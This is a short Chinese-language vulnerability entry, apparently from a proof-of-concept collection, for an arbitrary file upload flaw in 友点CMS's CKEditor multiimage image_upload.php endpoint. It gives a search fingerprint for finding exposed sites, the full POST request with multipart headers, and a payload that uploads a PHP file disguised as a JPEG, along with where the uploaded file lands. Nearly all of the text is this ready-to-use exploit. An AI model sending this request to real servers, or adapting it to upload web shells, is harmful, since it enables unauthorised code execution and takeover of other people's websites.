# 友点CMSimage_upload.php文件上传漏洞

- **系统**：友点CMSimage_upload.php　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="友点建站-CMS"`
- **请求**：`POST /Public/ckeditor/plugins/multiimage/dialogs/image_upload.php HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=00content0boundary00`　`Content-Length: 161`

**请求体 / payload**
```
--00content0boundary00
Content-Disposition: form-data; name="files"; filename="1.php"
Content-Type: image/jpg
<?php phpinfo();?>
--00content0boundary00--

上传文件位置
/Public/image/uploads/1708964444653.php
```

**其他**
- 友点CMS image\_upload.php 文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 友点cms